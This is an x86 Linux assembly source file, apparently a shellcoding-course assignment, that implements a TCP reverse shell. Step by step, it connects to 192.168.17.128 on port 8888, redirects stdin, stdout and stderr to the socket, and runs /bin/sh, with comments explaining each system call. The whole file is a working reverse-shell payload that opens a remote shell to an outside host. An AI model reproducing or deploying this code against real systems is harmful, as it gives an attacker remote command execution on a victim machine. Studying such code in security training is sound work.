; SLAE Assignment 2: TCP Reverse Shell
; Student ID: SLAE - 905

global _start			

section .text
_start:
	IPADDR equ 0x8011a8c0 ; Address 192.168.17.128
	PORTNO equ 0xB822 ; port 8888 in network byte order
	
	;;;;;;;;;; Step 1: Create Socket ;;;;;;;;;;
	;; System Call 0x66 "sys_socketcall" => eax is 0x66
	push 0x66
	pop eax
	;; "call" is "sys_socket" (value 0x1) => ebx is 0x1
	push 0x1
	pop ebx
	;; s = socket(AF_INET, SOCK_STREAM, 0) => Push in 0x0, follow by 0x1, and lastly 0x2
	xor ecx,ecx
	push ecx
	push 0x1
	push 0x2
	;; ecx to store pointer to socket args
	mov ecx, esp
	;;call = sys_socket. Returned socket descriptor in eax
	int 0x80

	;;;;;;;;;; Step 2: Connect ;;;;;;;;;;
	;; Store socket descriptor in esi
	mov esi, eax
	;; System Call 0x66 "sys_socketcall" => eax is 0x66
	push 0x66
	pop eax
	;; "call" is "sys_connect" (value 0x3) => ebx is 0x3
	push 0x3
	pop ebx
	;; First, create addr in stack:
	;; addr.sin_family = AF_INET; //value is 2
	;; addr.sin_port = htons(8888); //port to connect to, default is 8888
	;; addr.sin_addr.s_addr = IPADDR; //connect to 192.168.17.128 (IPADDR)
	push IPADDR ; IP Address, IPADDR
	push word PORTNO ; port 8888, PORTNO
	push word 0x2 ; value of AF_INET
	mov ecx, esp ; address to addr stored in ecx
	;; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	push 0x10 ; addr is 16 byes
	push ecx  ; address to addr
	push esi  ; socket descriptor
	;; store pointer to syscall arg to ecx
	mov ecx, esp
	;; call = sys_connect
	int 0x80

	;;;;;;;;;; Step 3: Redirect stdin, stdout and stderr to socket ;;;;;;;;;;
	;; int dup2(int oldfd, int newfd);
	;; set ecx to 2 for stderr, 3rd arg
	push 0x2
	pop ecx
	;; set ebx to socket descriptor, which is stored in esi
	mov ebx, esi
loop:
	;; System Call 0x3F "sys_dup2" => eax is 0x3F
	push 0x3F
	pop eax
	;; system call sys_dup2
	int 0x80
	dec ecx
	jns loop

	;;;;;;;;;; Step 4: execve Shell ;;;;;;;;;;
	xor edx,edx
	push edx ; push null
	push 0x68732f2f ; "//sh" in reverse order
	push 0x6e69622f ; "/bin" in reverse order
	mov ebx, esp ; ebx store address to "/bin/sh" string
	push edx; push null
	push ebx ; push address of string "/bin/sh" to stack
	mov ecx, esp
	push edx ; push null for envp
	mov edx, esp ; envp
	;; System Call 0xB "execve" => eax is 0xB
	push 0xB
	pop eax
	int 0x80



